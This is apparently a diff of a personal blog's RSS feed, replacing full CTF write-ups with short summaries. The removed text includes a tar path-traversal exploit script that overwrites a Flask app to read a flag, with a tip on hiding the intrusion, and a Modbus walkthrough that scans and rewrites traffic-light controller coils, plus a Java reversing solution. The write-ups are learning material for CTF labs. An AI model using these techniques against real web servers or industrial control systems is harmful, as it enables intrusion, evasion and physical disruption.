-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rom flask import Flask, jsonify
-from application.blueprints.routes import web, api
-
-app = Flask(__name__)
-app.config.from_object(&amp;#39;application.config.Config&amp;#39;)
-
-app.register_blueprint(web, url_prefix=&amp;#39;/&amp;#39;)
-app.register_blueprint(api, url_prefix=&amp;#39;/api&amp;#39;)
-
-@app.errorhandler(404)
-def not_found(error):
-    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Found&amp;#39;}), 404
-
-@app.errorhandler(403)
-def forbidden(error):
-    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Not Allowed&amp;#39;}), 403
-
-@app.errorhandler(400)
-def bad_request(error):
-    return jsonify({&amp;#39;error&amp;#39;: &amp;#39;Bad Request&amp;#39;}), 400
-
-@app.route(&amp;#39;/flag&amp;#39;)
-def flag():
-    file = open(&amp;#39;/app/flag&amp;#39;, &amp;#39;r&amp;#39;)
-    return f.read()
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is what the new main file will look like.&lt;/p&gt;
-&lt;p&gt;If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won&amp;rsquo;t figure out where we got the flag from.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import tarfile, requests
-
-zpath = &amp;#34;../../../main.py&amp;#34;
-
-
-tf = tarfile.open(&amp;#34;payload.tar.gz&amp;#34;, &amp;#34;w:gz&amp;#34;)
-tf.add(&amp;#39;main.py&amp;#39;, zpath)
-tf.close()
-
-
-
-url = &amp;#34;http://64.227.36.32:32187/api/unslippy&amp;#34;
-
-files = {&amp;#34;file&amp;#34;: open(&amp;#39;payload.tar.gz&amp;#39;, &amp;#39;rb&amp;#39;)}
-
-r = requests.post(url, files=files)
-
-flag = requests.get(&amp;#34;http://64.227.36.32:32187/flag&amp;#34;)
-
-print(flag.text)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.&lt;/p&gt;
-&lt;p&gt;Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HTB{i_slipped_my_way_to_rce}
-&lt;/code&gt;&lt;/pre&gt;</description>
+      <guid>http://localhost:1313/posts/writeups/htb-uni-ctf/web-slippy/</guid>
+      <description>Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
+The directory tree of the source code as follow.
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ./challenge ├── application │ ├── blueprints │ │ └── routes.</description>
     </item>
-    
     <item>
       <title>HTB UNI CTF : Light The Way</title>
-      <link>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/lighttheway/</link>
+      <link>http://localhost:1313/posts/writeups/htb-uni-ctf/lighttheway/</link>
       <pubDate>Sun, 21 Nov 2021 23:22:26 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/htb-uni-ctf/lighttheway/</guid>
-      <description>&lt;p&gt;Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/question.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;scada&#34;&gt;SCADA&lt;/h2&gt;
-&lt;p&gt;Supervisory control and data acquisition is a system that allows industrial organizations to:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;* Conrtol processes
-* Monitor
-* Interact with devices
-* Record events
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;a href=&#34;https://inductiveautomation.com/resources/article/what-is-scada&#34;&gt;For more information on SCADA&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&#34;starting-point&#34;&gt;Starting Point&lt;/h2&gt;
-&lt;p&gt;For this specific challenge, we needed to compromise traffic lights. There wasn&amp;rsquo;t much information to work with, given only the IP address of the system. It was also in the same network, which makes things easier.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/HMI.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The given IP was : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;A website and the IP was all the information that I had. So, where did I begin?&lt;/p&gt;
-&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;Yep, nmap. It allows us to scan the system and find information on it.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p- 10.129.96.95 -sCV
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/nmap.png&#34; alt=&#34;test&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Key Points:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;* PORT 22 : used for SSH, I wouldn&#39;t even try to attack it
-* PORT 80 : running nginx server for the front end
-* PORT 502: This is the interesting port. (I didn&#39;t knew it was interesting until I googled and found out that modbus uses it)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;After figuring those stuff out, now&amp;rsquo;s the time to enumerate more information on the Modbus.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -p 502 --script modbus-discover 10.129.96.95
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/nmap2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Didn&amp;rsquo;t give much but it confirms that Modbus is running on port 502.&lt;/p&gt;
-&lt;h3 id=&#34;more-info&#34;&gt;More info!&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;https://c.tenor.com/ayUs509YzsIAAAAC/kid-bored.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;What I have here isn&amp;rsquo;t enough to make the exploit. So, what should I do?&lt;/p&gt;
-&lt;p&gt;Turning back to my good old friend, internet I found a metaspolit script &lt;code&gt;auxiliary/scanner/scada/modbus_findunitid&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;Using the script, I was able to figure out that there are more than one unit in the given SCADA system. I didn&amp;rsquo;t let the script complete, but there are more than 200 units.&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;Why are there so many?&lt;/strong&gt;&lt;/em&gt;
-There are 6 junctions in the picture, and if there are more than 200 does each unit control one light?&lt;/p&gt;
-&lt;p&gt;Before answerinng that question let&amp;rsquo;s first look at what data the first unit has.&lt;/p&gt;
-&lt;h2 id=&#34;get-data&#34;&gt;Get DATA&lt;/h2&gt;
-&lt;p&gt;Let&amp;rsquo;s search if there&amp;rsquo;s any more metaspolit script that we can use.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6&amp;gt; search modbus
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After searching for modbus, I found 6 modules/scripts&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Matching Modules
-================
-
-   #  Name                                            Disclosure Date  Rank    Check  Description
-   -  ----                                            ---------------  ----    -----  -----------
-   0  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
-   1  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
-   2  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
-   3  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
-   4  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
-   5  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
-   6  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Modbusclient module seems to be the most useful for this case.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6&amp;gt; use auxiliary/scanner/scada/modbusclient
-msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; show options
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;So the RHOST for this  instance will be the IP address : &lt;code&gt;10.129.96.95&lt;/code&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set RHOST 10.129.96.95
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We need to set where we want to start reading the DATA from to do that we need wo set the DATA_ADDRESS field&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set DATA_ADDRESS 0
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then we need to set how many DATA_ADDRESS we want to read.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;set NUMBER 18
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s see what those numbers mean.&lt;/p&gt;
-&lt;p&gt;This small python command takes the arr of int and converts to a string.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;arr = [97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 116, 114, 117, 101]
-
-print(&amp;#34;&amp;#34;.join(chr(x) for x in arr))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With the python script I was able to get a string: &lt;code&gt;auto_mode:true&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id=&#34;setting-it-to-manual&#34;&gt;Setting it to manual&lt;/h2&gt;
-&lt;p&gt;If I remember correctly the description of the challenge wants us to set it to manual mode. Which means we need to set the auto_mode to false.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;print([ord(x) for x in &amp;#34;auto_mode:false&amp;#34;])
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Used this python script to get the numbers that we need to send in order to set the SCADA system to false.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[97, 117, 116, 111, 95, 109, 111, 100, 101, 58, 102, 97, 108, 115, 101]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote a simple python script that uses the Perl Modbus library to write to the holding registry.
-&lt;img src=&#34;https://c.tenor.com/zOAWdshu_I0AAAAd/boring-unimpressed.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Yea, I later figured out that python had a library to connect to modbus, but anyways it works.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import subprocess
-
-for i in range(1,20):                           #  :  f   a   l   s   e
-    cmd = f&amp;#34;modbus write -w -s {i} 10.129.96.95 10 58 102 97 108 115 101&amp;#34;
-    subprocess.run(cmd.split(&amp;#34; &amp;#34;))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;modbus {command} {type} {slaveid} {target_ip} {data_address} {information_to_write}&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;I set it to the first 20 to see if that would make any difference. It didn&amp;rsquo;t make any visual difference. But if I look at the registers again, it changed the values.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta3.png&#34; alt=&#34;&#34;&gt;
-&lt;em&gt;First one is before running the script, second one is after running the python script.&lt;/em&gt;&lt;/p&gt;
-&lt;p&gt;So, if that didn&amp;rsquo;t change anything, what can I do?&lt;/p&gt;
-&lt;p&gt;Coils also store values, and I can read and write it.&lt;/p&gt;
-&lt;h2 id=&#34;reading-coils&#34;&gt;Reading Coils&lt;/h2&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set action READ_COILS
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Reading the first 18 coils, it was all just bunch of 0s so I decided to read 2000 of them to see if I find anything good.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set NUMBER 2000
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/meta4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;After trying to get 2000 coils, I can see some interesting information. There are bunch of 1 in the middle.&lt;/p&gt;
-&lt;p&gt;Let&amp;rsquo;s see what other Units have.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf6 auxiliary(scanner/scada/modbusclient)&amp;gt; set UNIT_NUMBER 2
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;UNIT_NUMBER determines which slave node we are viewing.&lt;/p&gt;
-&lt;p&gt;After looking through 7 to 8 of them I found out that only 6 of it hold any valuable data. So, I concluded that each unit represents one junction.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from pyModbusTCP.client import ModbusClient
-
-data_address = {}
-
-for i in range(1,7):
-    c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=i, auto_open=True)
-
-    regs = c.read_coils(0,2000)
-
-    data_address[i] = regs.index(True)
-
-print(data_address)
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I wrote this script to get the DATA_ADDRESS of all the 1/True places.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{1: 571, 2: 1921, 3: 531, 4: 1267, 5: 925, 6: 888}
-&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;the-exploit&#34;&gt;The exploit?&lt;/h1&gt;
-&lt;p&gt;Now I have all the necessary information on the data address of where they are reading the traffic data from, I can create a payload to change the traffic lights.&lt;/p&gt;
-&lt;p&gt;The first three bits represents the North side of the light, and goes in order of&lt;/p&gt;
-&lt;p&gt;Green Yellow Red&lt;/p&gt;
-&lt;p&gt;IF we curl the api &lt;code&gt;http://10.129.96.95/api&lt;/code&gt; we can see value for all the colors and the direction.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/curl.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;After doing some digging I found out that the API doesn&amp;rsquo;t represent the data in the same way the registers stores the data.&lt;/p&gt;
-&lt;p&gt;In the registers we need to pass in data as follow:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;NG NY NR EG EY ER SG SY SR WG WY WR
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/lights.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Looking at the picture we need to change the west side to green because the car is about to turn towards west for the first junction, and we have to turn the East side to Green for the 2nd and 4th junction, and finally the north side for 6th junction.&lt;/p&gt;
-&lt;p&gt;So the values for junction one are as follow:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[False, False, True, False, False, True, False, False, True, True, False, False]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will turn on the green light on the west.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[False, False, True, False, False, True, False, False, True, False, False, True]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, What I was saying about the direction didn&amp;rsquo;t make any sense, I had to play around for a long time before I figured out the correct light to turn on. The placement of the lights didn&amp;rsquo;t sense to me, it might be becuase the difference in driving in different country.&lt;/p&gt;
-&lt;p&gt;The following script did the job.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from pyModbusTCP.client import ModbusClient
-
-data_address = {}
-
-c = ModbusClient(host=&amp;#34;10.129.96.95&amp;#34;, port=&amp;#34;502&amp;#34;, unit_id=1, auto_open=True)
-for i in range(1,7):
-    c.unit_id(i)
-    regs = c.read_coils(0,2000)
-
-    data_address[i] = regs.index(True)
-
-c.unit_id(1)
-c.write_multiple_coils(571,[False, False, True, False, False, True, False, False, True, True, False, False])
-
-c.unit_id(2)
-c.write_multiple_coils(1920, [True, False, False, False, False, True,False, False, True, False, False, True])
-
-
-c.unit_id(4)
-c.write_multiple_coils(1266, [False, False, True, False, False, True,False, False, True, True, False, False])
-
-
-c.unit_id(6)
-c.write_multiple_coils(886,[False, False, True, False, False, True, False, False, True, True, False, False])
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;After running the script, the car moved and I found the flag.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/lighttheway/lighttheway.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Flag:&lt;code&gt;HTB{w3_se3_tH3_l1ght}&lt;/code&gt;&lt;/p&gt;
-</description>
+      <guid>http://localhost:1313/posts/writeups/htb-uni-ctf/lighttheway/</guid>
+      <description>Light the was a challenge with a medium difficulty level that tested a person’s knowledge of the SCADA system. Before starting this challenge, I was clueless about this system. I learned a lot through this challenge, and I hope I can share some knowledge with you.
+SCADA Supervisory control and data acquisition is a system that allows industrial organizations to:
+* Conrtol processes * Monitor * Interact with devices * Record events For more information on SCADA</description>
     </item>
-    
     <item>
       <title>Integrity Check</title>
-      <link>https://drMoscovium.dev/posts/writeups/k3rn3lctf/integrity-check/</link>
+      <link>http://localhost:1313/posts/writeups/k3rn3lctf/integrity-check/</link>
       <pubDate>Mon, 15 Nov 2021 15:38:22 -0500</pubDate>
-      <author>gautamyojan0@gmail.com (Yojan Gautam)</author>
-      <guid>https://drMoscovium.dev/posts/writeups/k3rn3lctf/integrity-check/</guid>
-      <description>&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/challengeDescription.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Attachment: &lt;a href=&#34;https://github.com/Kasimir123/K3RN3LCTF-2021/blob/main/downloadable/integrity-check/IntegrityCheck.jar&#34;&gt;File&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
-&lt;p&gt;I started out by running the file.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar IntegrityCheck.jar
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/initial_run.png&#34; alt=&#34;Test&#34;&gt;&lt;/p&gt;
-&lt;p&gt;We can see that something is wrong in the function name.&lt;/p&gt;
-&lt;p&gt;Looking at the hint, we all can say that we have to use some sort of Java Bytecode modifying tool. So I searched up online and found quite a few.&lt;/p&gt;
-&lt;p&gt;The one that I found useful was the &lt;a href=&#34;https://www.coley.software/Recaf/&#34;&gt;recaf&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Opening the IntegrityCheck.jar file
-&lt;img src=&#34;https://drMoscovium.dev/integrity/Opening.png&#34; alt=&#34;Opening the file&#34;&gt;&lt;/p&gt;
-&lt;p&gt;The class name looks really wrong. But what is the real name?&lt;/p&gt;
-&lt;p&gt;I tried looking around for the real name, I didn&amp;rsquo;t find it until I used another tool. rej&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/ClassName.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;With this tool we can see the source file name. I don&amp;rsquo;t know why this is the case, but now I have my real class name.&lt;/p&gt;
-&lt;p&gt;Now to change the class name I first tried using rej to change it, it still gave me illegal method name error. So I changed the name of the function as well. After that it kept gave me &lt;code&gt;NullPointerException&lt;/code&gt; because I wasn&amp;rsquo;t changing it properly. I was able to fix that by using Recaf tool.&lt;/p&gt;
-&lt;p&gt;After changing the class and the method name I had the export to a new jar &lt;code&gt;changed.jar&lt;/code&gt; . I was able to successfully run this jar using this command&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;java -jar changed.jar&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/changedRun.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;Alr, Now there are no errors.&lt;/p&gt;
-&lt;p&gt;Time to find the password.
-&lt;img src=&#34;https://drMoscovium.dev/integrity/password.png&#34; alt=&#34;&#34;&gt;
-After just scanning the decompiled code, I was able to find place where they are validating the password.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;String throw8 = throw6[0].getClassName();
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It is storing the name of the class in the variable throw8. (Let&amp;rsquo;s ignore other code for a while)&lt;/p&gt;
-&lt;p&gt;Then it&amp;rsquo;s creating a new char array&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;char[] throw9 = throw8.toCharArray();
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;It basically converts the name of the class into an array of characters&lt;/p&gt;
-&lt;p&gt;After this command throw 9 would look something like&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[&amp;#39;D&amp;#39;, &amp;#39;e&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;r&amp;#39;, &amp;#39;y&amp;#39;, &amp;#39;p&amp;#39;, &amp;#39;t&amp;#39;, &amp;#39;o&amp;#39;, &amp;#39;r&amp;#39;]
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Right after that there&amp;rsquo;s a if statement that does some funky stuffs.&lt;/p&gt;
-&lt;p&gt;It&amp;rsquo;s takes the first 4 characters from the &lt;code&gt;throw9&lt;/code&gt; char array, and xor&amp;rsquo;s it with some number to validate the input.
-User given password is stored in &lt;code&gt;throw10&lt;/code&gt; char array.&lt;/p&gt;
-&lt;p&gt;To find the correct password we can just xorg the the values that we already know&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/pythonscript.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I wrote a small python script to calculate the password. &lt;code&gt;GiCw:&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;After getting the password, I ran following command&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar changed.jar GiCw:
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/werid_output.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;I got the following output. It wasn&amp;rsquo;t the flag. I must have done something wrong.&lt;/p&gt;
-&lt;p&gt;After I re-analyze the code, I figured out that the code uses function name to compute the flag.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://drMoscovium.dev/integrity/flag_code.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
-&lt;p&gt;It uses the &lt;code&gt;throw7&lt;/code&gt; variable, which takes the method name.&lt;/p&gt;
-&lt;p&gt;So, if I keep the original method name, it will give me error, and if I change it it will give me wrong flag.&lt;/p&gt;
-&lt;p&gt;After thinking for a while. I came up with two solutions.&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Write a script that replicates the behavior&lt;/li&gt;
-&lt;li&gt;Figure out a way to run using the original method name&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;After searching online for a while I found this out &lt;a href=&#34;https://bugs.java.com/bugdatabase/view_bug.do?bug_id=JDK-8214719&#34;&gt;-Xverify:none&lt;/a&gt;,using this tag I was able to run the jar even with the illegal method name.&lt;/p&gt;
-&lt;p&gt;I created &lt;code&gt;New-Integrity.jar&lt;/code&gt; where I only changed the class name didn&amp;rsquo;t touch the function name.&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -Xverify:none -jar New-Integrity.jar GiCw:
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;it gave me the flag: &lt;code&gt;flag{H3LL0_YOU_KN0W_SOURC3_FIL3}&lt;/code&gt;&lt;/p&gt;
-</description>
+      <guid>http://localhost:1313/posts/writeups/k3rn3lctf/integrity-check/</guid>
+      <description>Attachment: File
+Solution I started out by running the file.
+1 java -jar IntegrityCheck.jar We can see that something is wrong in the function name.
+Looking at the hint, we all can say that we have to use some sort of Java Bytecode modifying tool. So I searched up online and found quite a few.
+The one that I found useful was the recaf
+Opening the IntegrityCheck.jar file The class name looks really wrong.</description>
     </item>
-    
+    <item>
+      <title>Why everyone shouldn&#39;t use linux?</title>
+      <link>http://localhost:1313/posts/post2/</link>
+      <pubDate>Tue, 02 Nov 2021 16:48:55 -0400</pubDate>
+      <guid>http://localhost:1313/posts/post2/</guid>
+      <description>A few days ago, while talking to a Computer Science major in my college, I figured out that not everyone should use Linux.
+A disclaimer, when I say Linux I mean Linux Desktop. What I say here doesn&amp;rsquo;t apply to Linux servers.
+Linux Linux is an open-source software developed by a guy named Linus Torvalds. Now countless many people are contributing to the code. Open source means that the software is free, and anyone with enough knowledge can change the code.</description>
+    </item>
   </channel>
 </rss>
